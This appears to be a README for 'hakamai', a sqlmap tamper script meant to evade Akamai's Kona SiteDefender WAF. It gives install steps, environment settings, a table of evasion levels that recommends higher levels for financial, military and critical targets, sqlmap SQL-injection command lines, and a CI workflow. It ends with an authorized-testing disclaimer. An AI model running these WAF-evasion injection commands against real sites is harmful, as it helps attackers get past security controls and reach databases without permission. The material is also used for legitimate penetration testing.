# Kona SiteDefender Advanced Bypass Tamper Script 
## Comprehensive evasion techniques collection Research and educational purposes only by Zzl0y
* Multi-level tamper script designed to bypass Akamai's Kona SiteDefender WAF with sophisticated evasion techniques and adaptive payload transformation.


## Usage Guide

## 1. Installation and Setup
```bash
# Make it executable
chmod +x hakamai.py

# Copy to SQLMap tampers directory
cp hakamai.py ~/.sqlmap/tamper/
# OR
cp hakamai.py /opt/sqlmap/tamper/
```

## 2. Environment Configuration
```bash
# Core configuration
export TAMPER_LEVEL=3          # Evasion level (1-5)
export TAMPER_DEBUG=1          # Enable debug logging
export TAMPER_AGGRESSIVE=1     # Enable aggressive mode
export TAMPER_STEALTH=1        # Enable stealth mode
export TAMPER_SEED=12345       # Reproducible randomization seed

# Advanced configuration
export TAMPER_LOG_FILE=/tmp/tamper.log    # Custom log file
export TAMPER_STATS=1                     # Enable statistics
```

## 3. Usage Examples
```bash
# Basic professional usage
sqlmap -u "https://target.com/app.php?id=1" \
       --tamper=hakamai \
       --random-agent \
       --delay=2

# High-security target (Level 4 Stealth)
TAMPER_LEVEL=4 TAMPER_STEALTH=1 sqlmap \
    -u "https://target.com/app.php?id=1" \
    --tamper=hakamai \
    --random-agent \
    --delay=5 \
    --timeout=60 \
    --retries=3 \
    --proxy=http://127.0.0.1:8080

# Maximum evasion (Level 5 Adaptive)
TAMPER_LEVEL=5 TAMPER_AGGRESSIVE=1 sqlmap \
    -u "https://hardened-target.com/app.php?id=1" \
    --tamper=hakamai \
    --random-agent \
    --delay=10 \
    --timeout=90 \
    --threads=1 \
    --technique=BEUST

# Debug and analysis mode
TAMPER_DEBUG=1 TAMPER_LEVEL=3 sqlmap \
    -u "https://target.com/app.php?id=1" \
    --tamper=hakamai \
    --flush-session \
    -v 6 2>&1 | tee analysis.log
```

## 4. Level Selection Guide
```bash
Level	 Use Case	            Target Environment	            Recommended Settings
1	    Basic WAF, Testing	  Development, Light Security	    TAMPER_LEVEL=1
2	    Standard Production	  Most Corporate WAFs	            TAMPER_LEVEL=2 (default)
3	    Enhanced Security	    Strict Corporate, Government	  TAMPER_LEVEL=3 TAMPER_AGGRESSIVE=1
4	    High-Security Targets	Financial, Military, Critical	  TAMPER_LEVEL=4 TAMPER_STEALTH=1
5	    Maximum Evasion	      Hardened Environments, SOC	    TAMPER_LEVEL=5 TAMPER_AGGRESSIVE=1
```

## Hakamai.sh Automation Script
*Hakamai_auto.sh - Kona SiteDefender Testing Suite

## ⚡ Advanced Features

## Performance Monitoring
```bash
# Enable comprehensive monitoring
export TAMPER_STATS=1
export TAMPER_DEBUG=1

# Run with profiling
python -m cProfile -o tamper_profile.prof hakamai.py --benchmark
```

## Custom Seed for Reproducibility
```bash
# Set seed for reproducible testing
export TAMPER_SEED=12345
sqlmap -u "target.com" --tamper=hakamai

# Results will be identical across runs with same seed
```

## Integration with CI/CD
* yaml
```yaml
# .github/workflows/security-test.yml
name: Security Testing with Kona Bypass
on: [push]
jobs:
  security-test:
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v2
    - name: Setup SQLMap
      run: |
        git clone https://github.com/sqlmapproject/sqlmap.git
        cp hakamai.py sqlmap/tamper/
    - name: Run Security Test
      env:
        TAMPER_LEVEL: 3
        TAMPER_DEBUG: 1
      run: |
        cd sqlmap
        python sqlmap.py -u "${{ secrets.TEST_URL }}" --tamper=hakamai --batch
```


## DISCLAIMER:
-----------
This script is intended for authorized penetration testing and security research only.
Use only in environments where you have explicit written permission to test.
Unauthorized use against systems you do not own is illegal and unethical.
